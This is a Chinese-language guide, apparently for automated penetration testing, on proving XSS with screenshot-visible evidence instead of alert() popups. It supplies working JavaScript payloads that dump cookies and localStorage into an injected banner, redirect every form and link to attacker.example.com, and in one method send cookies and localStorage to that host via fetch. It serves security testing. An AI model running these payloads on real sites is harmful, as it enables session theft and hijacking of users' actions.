# XSS Evidence Methods (替代 alert 弹窗)

> **CRITICAL: `alert()` / `confirm()` / `prompt()` cannot be screenshotted.**
> 这些是 OS 级对话框，渲染在浏览器窗口之外。`page.screenshot()` 只截浏览器 viewport，永远截不到弹窗本身。

## 可行的证据方法（按强度排序）

### 1. DOM 修改（最推荐）⭐

**原理**: XSS 攻击者会修改 DOM。修改的内容**可见、可截图**。

```javascript
(function() {
  // 1. 修改 document.title（浏览器标签页可见）
  document.title = '[XSS PWNED] ' + document.title;

  // 2. 注入可见横幅（含敏感信息）
  const banner = document.createElement('div');
  banner.id = 'xss-evidence-banner';
  banner.style.cssText = [
    'position: fixed',
    'top: 0; left: 0; right: 0',
    'background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%)',
    'color: white',
    'padding: 30px 40px',
    'z-index: 2147483647',  // 最大 z-index
    'font-family: "Consolas", monospace',
    'box-shadow: 0 8px 32px rgba(0,0,0,0.5)',
    'border-bottom: 4px solid #ffeb3b'
  ].join(';');

  banner.innerHTML = `
    <h1 style="margin:0 0 16px 0;font-size:36px;">★ XSS PROOF — JavaScript Executed</h1>
    <div style="display:grid;grid-template-columns:200px 1fr;gap:8px 24px;font-size:16px;">
      <div><b>Domain:</b></div><div>${document.domain}</div>
      <div><b>URL:</b></div><div>${location.href}</div>
      <div><b>Cookie:</b></div><div style="word-break:break-all;color:#ffeb3b;">${document.cookie || '(空)'}</div>
      <div><b>localStorage:</b></div><div style="word-break:break-all;font-size:13px;">${JSON.stringify(localStorage)}</div>
      <div><b>Time:</b></div><div>${new Date().toISOString()}</div>
    </div>
  `;
  document.body.appendChild(banner);

  // 3. 持久化标记（验证脚本执行过）
  try {
    localStorage.setItem('xss_pwned_at', new Date().toISOString());
    localStorage.setItem('xss_pwned_by', 'XSS_PAYLOAD');
  } catch(e) {}

  // 4. 修改页面表单（证明可劫持用户操作）
  document.querySelectorAll('form').forEach(f => {
    const orig = f.action;
    f.action = 'https://attacker.example.com/steal';
    f.dataset.originalAction = orig;
  });
})();
```

**优势**:
- ✅ 截图可见（红色横幅 + 敏感信息）
- ✅ 真实攻击场景（攻击者会做的事）
- ✅ 多维度证据（DOM + localStorage + 表单劫持）
- ✅ 持久化（刷新页面仍在，因为 custom_js 重新执行）

### 2. console.log + Playwright 捕获

**原理**: 在 payload 中 `console.log()` 证明代码执行，用 Playwright 捕获后展示。

```javascript
// Payload
console.log('XSS_PROOF_' + document.domain);
console.log('Cookie: ' + document.cookie);
```

```javascript
// Playwright 脚本
const consoleLogs = [];
page.on('console', msg => consoleLogs.push(msg.text()));
// ... navigate, trigger XSS ...
// 截图前显示 console 输出
await page.evaluate((logs) => {
  const debug = document.createElement('div');
  debug.style.cssText = 'position:fixed;bottom:0;left:0;right:0;background:black;color:#0f0;padding:15px;font-family:monospace;font-size:12px;z-index:99999;';
  debug.innerHTML = '<h3>Console Output (XSS Proof)</h3><pre>' + logs.join('\n') + '</pre>';
  document.body.appendChild(debug);
}, consoleLogs);
await page.screenshot({ path: 'step_console_proof.png' });
```

**优势**:
- ✅ 真实捕获浏览器 console
- ✅ 截图可见
- ⚠️ 需要在 Playwright 脚本中处理（不直观）

### 3. document.write 覆盖页面

**原理**: 用 `document.write` 完全重写页面内容。

```javascript
document.open();
document.write(`
  <html>
    <body style="background:red;color:white;font-family:monospace;padding:50px;">
      <h1>★ XSS PROOF ★</h1>
      <p>JavaScript was executed in your browser session.</p>
      <p>Domain: ${document.domain}</p>
      <p>Cookie: ${document.cookie}</p>
    </body>
  </html>
`);
document.close();
```

**优势**:
- ✅ 截图最直观（整页变红）
- ⚠️ 会丢失原页面（刷新恢复）

### 4. 网络外带（OOB）

**原理**: 通过 `fetch` / `XMLHttpRequest` 发送数据到攻击者服务器。

```javascript
// 需要外部接收服务器
fetch('https://attacker.example.com/x?' + btoa(JSON.stringify({
  domain: document.domain,
  cookie: document.cookie,
  localStorage: JSON.stringify(localStorage)
})));
```

**优势**:
- ✅ 真实攻击场景
- ⚠️ 需要外部服务器
- ⚠️ 不可见（除非攻击者服务器有 dashboard）

### 5. 页面状态修改（轻量）

```javascript
// 修改所有链接
document.querySelectorAll('a').forEach(a => {
  a.href = 'https://attacker.example.com/phishing';
  a.textContent = '[XSS] ' + a.textContent;
});

// 修改页面 title
document.title = '[XSS PWNED] ' + document.title;

// 隐藏正常内容
document.body.style.display = 'none';
```

## 不可行/禁止的证据方法

### ❌ "alert 截图"

```javascript
// 错误: 截不到弹窗
alert('XSS_PROOF');
```

`alert()` 是 OS 级对话框，`page.screenshot()` 截不到。

### ❌ "dialog event fired"

```
// 错误: 只证明 dialog 创建，不代表实际危害
page.on('dialog', dialog => console.log('Dialog fired'));
```

这只是 Playwright 收到 dialog 事件，不是截图证据。

### ❌ 简单 title 修改

```javascript
// 弱证据: 仅修改 title，需要多个标签页或 hover 才能看到
document.title = 'XSS';
```

虽然能改 title，但单一证据不够强，应配合其他方法。

## 推荐组合

**最佳 XSS PoC payload**:

```javascript
// 1. DOM 修改（核心证据 - 截图可见）
(function() {
  const banner = document.createElement('div');
  banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:#d32f2f;color:white;padding:30px;z-index:2147483647;font-family:monospace;font-size:16px;';
  banner.innerHTML = `
    <h1 style="margin:0 0 16px 0;font-size:32px;">★ XSS PROOF ★</h1>
    <p><b>Domain:</b> ${document.domain}</p>
    <p><b>URL:</b> ${location.href}</p>
    <p><b>Cookie:</b> <span style="color:#ffeb3b;">${document.cookie || '(empty)'}</span></p>
    <p><b>localStorage:</b> ${JSON.stringify(localStorage)}</p>
    <p><b>Time:</b> ${new Date().toISOString()}</p>
  `;
  document.body.appendChild(banner);
  document.title = '[XSS PWNED] ' + document.title;
  try { localStorage.setItem('xss_pwned_at', new Date().toISOString()); } catch(e) {}
})();
```

**证据维度**:
1. 截图 1: 红色横幅覆盖页面（视觉证据）
2. 截图 2: console 捕获（`page.on('console')`）
3. 验证 3: 读取 localStorage 验证持久化
4. 可选 4: document.title 改变（标签页可见）

这样的 4 重证据比单一 alert 弹窗更有说服力。
